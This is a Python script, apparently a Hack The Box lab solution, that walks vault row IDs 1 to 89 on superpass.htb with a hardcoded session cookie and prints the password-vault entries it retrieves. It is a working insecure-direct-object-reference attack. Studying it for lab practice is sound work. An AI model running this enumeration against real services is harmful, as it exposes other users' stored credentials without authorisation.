import requests
from bs4 import BeautifulSoup
url_template = "http://superpass.htb/vault/row/{}"
output_file = "responses.html"

# Header used from my Windows PC
# New Cookies must be obtained if machine gets reset
headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "remember_token=9|146714b996528df11320c16d59c463f597e894fb2d3d45175231335541515e3cd8bc2e3ccbfecdc8c4016aeb729cb057f05dc83d67028378954859aee2dabc27; session=..eJwljkuKwzAQRK8ieh0GSa2P5VNkP4TQUnfHBueD5axC7j6C2VRRvKKoD1x1o75Ih_n3A-YYBnfpnW4CJzhvQl3M9ryZ9WGOp6HWBjTHsnbzGp0fuHwvpzGyS19gPva3jLQyzNAKalC1IbsstniOTbNHKdEmzzKpY5cGp9Q8YsmxNBWl5KxwmKhqoBiCxyHkSh5rrBNxYufQVvVcQ2LMRSigoA1aS1SNmZvk6iOP-9d3l_3_TYHvHxhdRyY.ZJMtHg.loDbC8MhMQj6NalwLBfC30ejdrg",
    "Connection": "close"
}


with requests.Session() as session:
    with open(output_file, "a", encoding="utf-8") as file:
        for id in range(1, 90):
            url = url_template.format(id)
            response = session.get(url, headers=headers)
            if response.status_code == 200:
                file.write(response.text + '\n')
                print("Downloaded id: ", id)
            else:
                print("Error for id: ", id)

with open(output_file, "r") as file:
    html_content = file.read()

soup = BeautifulSoup(html_content, "html.parser")

rows = soup.find_all("tr")

i = 0
for row in rows:
    print("Row", i)
    cells = row.find_all("td")

    for cell in cells:
        value = cell.text.strip()
        if value != "":
            print(value)
    i = i + 1
    print("------")
